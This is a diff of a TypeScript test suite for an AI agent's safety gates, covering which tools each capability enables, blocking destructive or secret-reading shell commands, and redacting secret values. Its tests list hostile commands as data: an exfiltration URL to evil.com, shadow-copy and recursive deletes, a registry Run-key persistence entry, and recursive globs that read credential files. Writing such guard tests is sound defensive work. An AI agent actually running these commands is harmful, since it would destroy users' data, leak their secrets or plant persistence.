@@ -6,8 +6,10 @@ import { test } from "node:test";
 import {
   agentShellVerdict,
   buildTools,
+  containsSecret,
   isDestructive,
   isSensitivePath,
+  redactSecrets,
   runAgentTask,
   shellTouchesSecrets,
   type AgentConfig,
@@ -104,25 +106,118 @@ const baseCfg = (over: Partial<AgentConfig>): AgentConfig => ({
   maxSteps: 10,
   anthropicApiKey: undefined,
   llmModel: "m",
+  secrets: [],
   ...over,
 });
 
-const io = () => ({ opts: { token: "t" }, chatId: 1, cwd: { value: "" }, note: () => {} });
+const io = (remember: (n: string) => boolean = () => true) => ({
+  opts: { token: "t" },
+  chatId: 1,
+  cwd: { value: "" },
+  note: () => {},
+  remember,
+});
 
-test("no capabilities → no tools", () => {
+test("no capabilities → no tools (not even remember)", () => {
   assert.equal(buildTools(baseCfg({}), io()).length, 0);
 });
 
-test("each capability arms exactly its tools", () => {
+test("each capability arms exactly its tools (+ remember once any action tool exists)", () => {
   const names = (cfg: AgentConfig) => buildTools(cfg, io()).map((t) => t.spec.name).sort();
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["shell"]) })), ["run"]);
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["files"]) })), ["list_dir", "read_file", "send_file", "write_file"]);
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["screen"]) })), ["screenshot"]);
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["apps"]) })), ["open"]);
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]) })), ["hotkey", "type_text"]);
-  // vision without an Anthropic key stays dark
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["shell"]) })), ["remember", "run"]);
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["files"]) })), ["list_dir", "read_file", "remember", "send_file", "write_file"]);
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["screen"]) })), ["remember", "screenshot"]);
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["apps"]) })), ["open", "remember"]);
+  // keyboard is RCE-equivalent → dark unless auto-shell is armed
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]) })), []);
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]), autoShell: true })), ["hotkey", "remember", "type_text"]);
+  // vision without an Anthropic key stays dark (and no action tool → no remember either)
   assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]) })), []);
-  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]), anthropicApiKey: "sk" })), ["look"]);
+  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]), anthropicApiKey: "sk" })), ["look", "remember"]);
+});
+
+test("open tool refuses arbitrary URLs in safe mode (auto-shell off)", async () => {
+  const safe = buildTools(baseCfg({ capabilities: new Set(["apps"]) }), io()).find((t) => t.spec.name === "open")!;
+  const out = await safe.exec({ target: "https://evil.com/c?d=leak" });
+  assert.match(out, /REFUSED/);
+  assert.match(out, /auto-shell/); // the URL branch is gated, not the app branch
+  // an app not on the allowlist is refused too (no side-effecting launch)
+  assert.match(await safe.exec({ target: "notepad" }), /allowlist/);
+});
+
+// ── expanded destructive blocklist (the review's confirmed evasions) ─────────
+
+test("isDestructive catches cmd/PowerShell aliases and interpreter deletes", () => {
+  for (const cmd of [
+    'rd /s /q "C:\\Users\\me\\Documents"',
+    "erase /s /q C:\\data\\*",
+    "powershell -c \"ri C:\\x -Recurse -Force\"",
+    "Remove-Item C:\\x -Rec -fo",
+    'node -e "require(\'fs\').rmSync(p,{recursive:true})"',
+    "python -c \"import shutil; shutil.rmtree('x')\"",
+    "git clean -fdx",
+    "vssadmin delete shadows /all /quiet",
+    "truncate -s 0 important.db",
+    'powershell -c "Stop-Computer -Force"',
+    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d evil /f',
+    "sdelete -p 3 secret.txt",
+  ]) {
+    assert.equal(isDestructive(cmd), true, `should refuse: ${cmd}`);
+  }
+});
+
+test("isDestructive still lets normal dev commands through", () => {
+  for (const cmd of ["git clone https://github.com/x/y", "npm install", "node build.mjs", "python -m pytest", "git status", "npm run build", "reg query HKCU", "git push origin main"]) {
+    assert.equal(isDestructive(cmd), false, `should allow: ${cmd}`);
+  }
+});
+
+test("shellTouchesSecrets catches the glob/recursion evasions, not just literal names", () => {
+  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"'), true);
+  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (gr*.json) do @copy "%f" x'), true);
+  assert.equal(shellTouchesSecrets("dir /s C:\\Users\\me\\*.key"), true);
+  assert.equal(shellTouchesSecrets("type settings.json"), true);
+  assert.equal(shellTouchesSecrets("npm run build"), false);
+});
+
+test("agentShellVerdict refuses the evasions even with auto-shell armed", () => {
+  const auto = { allowlist: [] as string[], autoShell: true };
+  assert.equal(agentShellVerdict('rd /s /q "C:\\x"', auto).run, false);
+  assert.equal(agentShellVerdict('node -e "require(\'fs\').rmSync(x)"', auto).run, false);
+  assert.equal(agentShellVerdict('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"', auto).run, false);
+  assert.equal(agentShellVerdict('reg add "HKCU\\...\\Run" /v x /d y /f', auto).run, false);
+});
+
+// ── secret-VALUE redaction (the durable, evasion-resistant control) ──────────
+
+test("redactSecrets strips known values and key-shaped blobs", () => {
+  const known = ["123456:AAExampleBotTokenValueHere_longenough"];
+  const dump = "token=123456:AAExampleBotTokenValueHere_longenough key=sk-ant-api03-ABCDEFGHIJKLMNOP pk=0x" + "a".repeat(64);
+  const red = redactSecrets(dump, known);
+  assert.ok(!red.includes("AAExampleBotTokenValueHere"), "known bot token stripped");
+  assert.ok(!red.includes("sk-ant-api03-ABCDEFGHIJKLMNOP"), "api key shape stripped");
+  assert.ok(!red.includes("0x" + "a".repeat(64)), "private key shape stripped");
+  assert.match(red, /\[redacted\]/);
+  // leaves normal build output alone
+  assert.equal(redactSecrets("Compiled successfully in 4.9s", known), "Compiled successfully in 4.9s");
+});
+
+test("containsSecret detects a laundered secret file's bytes", () => {
+  assert.equal(containsSecret('{"session":"0x' + "b".repeat(64) + '"}', []), true); // grant-shaped
+  assert.equal(containsSecret("MYTOKEN=123456:AAExampleBotTokenValueHere_x", ["123456:AAExampleBotTokenValueHere_x"]), true);
+  assert.equal(containsSecret("# My project notes\nBuild passes.", []), false);
+});
+
+test("the remember tool persists via the injected callback", async () => {
+  const saved: string[] = [];
+  const tools = buildTools(baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir() }), io((n) => {
+    saved.push(n);
+    return true;
+  }));
+  const remember = tools.find((t) => t.spec.name === "remember")!;
+  const out = await remember.exec({ note: "The Sakura-ios repo is missing hianime.ts" });
+  assert.match(out, /remember/i);
+  assert.deepEqual(saved, ["The Sakura-ios repo is missing hianime.ts"]);
 });
 
 // ── the loop (scripted model, real file tools in a temp root) ────────────────
@@ -140,6 +235,8 @@ function makeDeps(cfg: AgentConfig, turns: AgentTurn[], sent: string[], seen?: A
       sent.push(t);
     },
     note: () => {},
+    remember: () => true,
+    soulBlock: "IDENTITY: you are Robin.",
     stopFlag: { stopped: false },
     turnFn: async (_creds, opts: { messages: AgentMsg[]; tools: ToolSpec[]; system: string }) => {
       seen?.push(structuredClone(opts.messages));
